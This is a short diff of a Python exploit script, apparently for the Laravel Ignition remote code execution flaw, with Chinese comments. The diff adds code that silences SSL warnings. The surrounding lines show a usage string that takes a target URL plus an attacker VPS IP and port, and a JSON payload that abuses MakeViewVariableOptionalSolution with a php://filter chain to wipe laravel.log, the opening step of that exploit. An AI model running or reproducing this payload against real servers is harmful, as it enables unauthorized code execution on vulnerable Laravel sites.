@@ -2,6 +2,8 @@ import requests
 import sys
 import base64
 import os
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
 
 if __name__ == '__main__':
     print(
@@ -17,7 +19,10 @@ _______________   ________  ____          ________  ____________  ________
     # 防止奇怪问题
     if(sys.argv[1][-1]=='/'):
         sys.argv[1]=sys.argv[1][:-1]
-    
+    # 关闭ssl warning
+    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
     # 用法 python exp.py url vps_ip vps_port
     print(sys.argv)
     clear_log_payload={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
